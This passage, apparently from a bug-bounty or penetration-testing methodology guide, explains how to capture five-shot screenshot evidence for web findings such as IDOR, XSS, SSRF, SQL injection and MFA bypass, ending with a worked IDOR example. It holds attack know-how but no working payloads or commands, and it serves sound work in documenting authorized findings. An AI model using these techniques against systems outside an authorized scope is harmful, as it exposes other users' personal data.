- Timing: response time for timing-based attacks
- Impact chain: additional data accessible through the same vector

### 9.7 Adapting the Five-Shot Sequence

| Vulnerability Type | Shot 1 (Setup) | Shot 2 (Request) | Shot 3 (Before) | Shot 4 (Exploit) | Shot 5 (Verify) |
|-------------------|---------------|------------------|-----------------|------------------|-----------------|
| IDOR | Alice logged in | Request with Bob's ID | Alice's own data | Bob's data returned | Scope confirmation |
| XSS | Page with input | Payload in input | Page before submit | Alert executed | Cookie httpOnly check |
| SSRF | Server making req | Malicious URL | Normal fetch result | Callback from internal | Interactsh interaction |
| Auth Bypass | Unauth state | Direct nav to admin | 401/403 response | Admin content shown | Confirm no auth needed |
| Race Condition | Both req prepared | Repeater setup | Normal single req | Both succeed | Double-spend confirmed |
| SQLi | Injection point | SQL payload | Normal query | Error/union data | DB fingerprint shown |
| File Upload | Upload form | File with payload | Rejected upload | File accessible | Code exec or SSRF |
| MFA Bypass | MFA challenge | Direct URL nav | MFA required | Dashboard w/o MFA | Sensitive endpoint accessed |

### 9.8 Special Cases

#### Two-User Evidence Sequence
For findings requiring two users (Alice and Bob):
Shot 1: Alice login + cookie capture
Shot 2: Bob login + cookie capture
Shot 3: Alice's request with Bob's cookie (session hijacking)
Shot 4: Bob's dashboard shown with Alice's data
Shot 5: Both sessions shown side-by-side for clarity

#### Before/After Exploit Sequence
For findings that modify state:
Shot 1: Initial state (e.g., balance: )
Shot 2: Exploit request
Shot 3: State after exploit (e.g., balance: )
Shot 4: Second exploit (race condition round 2)
Shot 5: Final state (e.g., balance:  — proven 5x application)

### 9.9 Evidence Sequence Example (Full)

Finding: IDOR in order details API

Capture Sequence:
  1. idor-target-orders-setup.png
     — Logged in as alice_user (user_id: 123)
     — Alice's order list displayed: order_id: 12345, 12346

  2. idor-target-orders-request.png
     — Burp Repeater showing GET /api/orders/98765
     — Cookie: [REDACTED]
     — Red annotation: Modified order_id from 12345 to 98765

  3. idor-target-orders-before.png
     — Alice's legitimate request for order 12345
     — Response shows Alice's data only

  4. idor-target-orders-exploit.png
     — Request for order 98765 returns full order data
     — Response includes Bob's name, email, address, items
     — Red annotations: Bob's PII exposed to Alice

  5. idor-target-orders-verify.png
     — Scope policy showing /api/* in scope
     — Second request to order 98766 also returns data
     — Confirms this is not a one-off or cached response

--- EV LOG END SECTION 9 ---
